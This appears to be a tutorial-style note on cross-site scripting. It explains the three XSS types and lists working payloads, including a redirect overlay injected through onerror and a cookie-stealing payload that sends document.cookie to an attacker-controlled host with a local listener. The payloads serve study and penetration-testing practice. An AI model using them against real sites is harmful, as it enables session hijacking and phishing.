**Cross-Site Scripting** (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker injects malicious code, usually in the form of scripts, into a web page or application, which is then executed by unsuspecting users who visit that page. The injected code can steal sensitive data, manipulate web content, or perform actions on behalf of the user without their consent.

There are three main types of XSS attacks:

1. **Stored XSS:** The malicious code is permanently stored on a server and is served to multiple users when they access a specific page or resource. This type of XSS can have a long-lasting impact as it affects all subsequent visitors to the compromised page.

2. **Reflected XSS:** In this case, the injected code is reflected off a web server and immediately executed in response to a user's request. Typically, the attacker tricks the user into clicking on a malicious link containing the payload.

3. **DOM-based XSS:** This type of XSS occurs when the client-side script in a web page manipulates the Document Object Model (DOM) without proper sanitization or validation, allowing an attacker to execute malicious code on the client-side.
## Basic script
A basic example of an XSS payload is a simple JavaScript alert box. This payload triggers a pop-up alert when injected into a vulnerable site:
```javascript
<script>alert("hi")</script>
```

## Image-based XSS
With this type of script we are trying to upload an image, but providing a wrong source. We generate this error on purpose to execute the *onerror* javascript function that prints hi in a pop-upp suing alert.
```javascript
<img src='x' onerror=alert("hi") />
```

Also, we can use the onclick javascript's function. If we upload an image with a valid source when we click the image it will spawn the pop-up with the alert message.
```javascript
<img src="<valid url>" onclick=alert("hi") />
```

#### Payload example

An example of a payload that an attacker might use is one crafted with an <img> tag and an `onerror` attribute. This payload creates a button that notifies the user of a simulated "error" on the website. The malicious script effectively prevents the user from interacting with any other elements on the page, forcing them to click the button. Upon clicking, the user is redirected to a malicious website controlled by the attacker.  

```javascript
<img src="x" onerror="(function(){var m=document.createElement('div');m.style='position:fixed;top:0;left:0;width:100%;height:100%;background-color:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;';var a=document.createElement('div');a.style='background-color:white;padding:20px;border-radius:5px;text-align:center;';var msg=document.createElement('p');msg.textContent='Error occurred!';var b=document.createElement('button');b.textContent='Go to [example.com](http://example.com)';b.onclick=function(){window.location.href='[http://example.com](http://example.com)';};a.appendChild(msg);a.appendChild(b);m.appendChild(a);document.body.appendChild(m);})();" />
```

## Obtaining Cookies
One of the most common attack vectors is to steal the victim's session cookie. This can be done by injecting a payload that sends the victim's cookies to an attacker-controlled server.
```javascript
<img src=x onerror=fetch("own_ip:port/"+document.cookie);>
```
With this petition we induce the victim server to execute JS code. With this code the server tries to execute  a wrong image and on the error sends it's cookie to our machine. Before executing this payload is necessary to open a local port.
```bash
python3 -m http.server 80
```

## SVG script
When this code is injected into a web page, the SVG image will be loaded, and as soon as it's loaded, the `onload` event will fire, executing the JavaScript code and displaying the "1" in a pop-up alert box. It uses an SVG (Scalable Vector Graphics) element to trigger the JavaScript alert.

```javascript
<svg onload=alert(1)>
```

- Example:
If we are attacking a web where whatever you insert will be assigned to the variable query, this option of XSS could be useful.
```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}

QUERY="><svg onload=alert(1)>
```

## DOM XSS using an anchor in jQuery
```javascript
javascript:alert(document.cookie)
```
The code executes on the client side, within the user's browser. It doesn't rely on the server processing user input or delivering malicious content in the server response. Instead, it relies on manipulating the Document Object Model (DOM) of the current web page.

If an attacker can inject this code into a web page by manipulating user-generated content (e.g., through input fields or URLs), the injected code will execute within the user's browser. For example, an attacker might craft a URL like `https://example.com/?input=javascript:alert(document.cookie)` and trick a user into clicking it.

